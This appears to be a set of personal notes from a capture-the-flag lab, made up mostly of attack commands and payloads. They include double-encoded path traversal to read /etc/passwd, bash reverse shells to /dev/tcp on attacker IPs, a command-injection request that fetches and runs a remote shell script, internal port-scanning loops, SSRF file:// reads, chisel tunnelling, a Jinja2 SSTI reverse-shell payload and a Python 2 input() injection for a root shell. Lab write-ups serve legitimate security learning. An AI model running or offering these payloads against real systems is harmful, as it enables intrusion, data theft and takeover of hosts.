Burp double encoding

http://10.10.165.132/page/%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd

/page/%252fvar/www/html/index.php

bash -c 'bash -i >& /dev/tcp/10.10.160.106/4445 0>&1'

POST /gen.php HTTP/1.1
Host: localhost
Content-Length: 54
Content-Type: application/x-www-form-urlencoded

length=8;sh -c "$(curl -s 10.10.235.24:8000/shell.sh)"


================
for p in 22 80 443 3000 5000 6379 8000 8080 8081 9000 27017 3306 5432; do
  (echo > /dev/tcp/172.18.0.1/$p) >/dev/null 2>&1 && echo "host 172.18.0.1 has $p open"
done

for h in $(seq 1 10); do
  ip=172.18.0.$h
  for p in 22 80 443 3000 5000 6379 8000 8080 8081 9000 27017 3306 5432; do
    (echo > /dev/tcp/$ip/$p) >/dev/null 2>&1 && echo "$ip:$p open"
  done
done


curl -X POST -d 'website_url=file:///etc/passwd' http://172.18.0.1:5000


./chisel server -p 9000 --reverse

chisel client 10.10.199.180:9000 R:5000:172.18.0.1:5000 &

access: http://localhost:5000


===========

curl -X POST -d 'website_url=file:///etc/passwd' http://172.18.0.1:5000
file:///etc/passwd

file:///proc/self/environ  
file:///proc/self/cmdline

file:///home/hansolo/app/app.py

Server-Side Template Injection (SSTI) 

return render_template_string(website_content)

The content from pycurl is directly inserted into the template with %s formatting, then passed to render_template_string(). This means any Jinja2 template code in the fetched content will be executed!

test to confirm {{7*7}}

echo "{{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/10.10.160.106/4444 0>&1\"').read()}}" > shell.html

stabilise the shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

stty raw -echo; fg



./chisel server -p 9000 --reverse

chisel client 10.10.160.106:9000 R:5000:172.18.0.1:5000

access: http://localhost:5000
===


vault sript:

if [[ $content == $user_input ]]; uses bash pattern matching, not exact string comparison. This means:

* acts as a wildcard that matches ANY content
? matches any single character
[abc] matches any character in brackets

find password length:

? - see if it's 1 character
?? - see if it's 2 characters

[a-z]??????????? (lowercase)
[A-Z]??????????? (uppercase)
[0-9]??????????? (number)

or you can automate it using script

========

app.py

secret = input("Any words you want to add to the password? ")

In Python 2, the input() function is extremely dangerous. It does not read the user's entry as a string; instead, it evaluates the input as Python code. 

This means an attacker can provide any valid Python code at that prompt, and the script will execute it as the user running the script (in this case, root).

Python 2:

input() - Evaluates input as Python code (DANGEROUS)
raw_input() - Returns input as a string (SAFE)

Python 3:

input() - Returns input as a string (SAFE)
raw_input() - Doesn't exist

try:
    length = int(raw_input("Enter the desired length of the password: "))
except NameError:
    length = int(input("Enter the desired length of the password: "))

- Script tries raw_input() first (Python 2 syntax)
- If that fails (Python 3), it falls back to input()
- This means it's designed to work with both Python versions


__import__('os').system('/bin/bash')
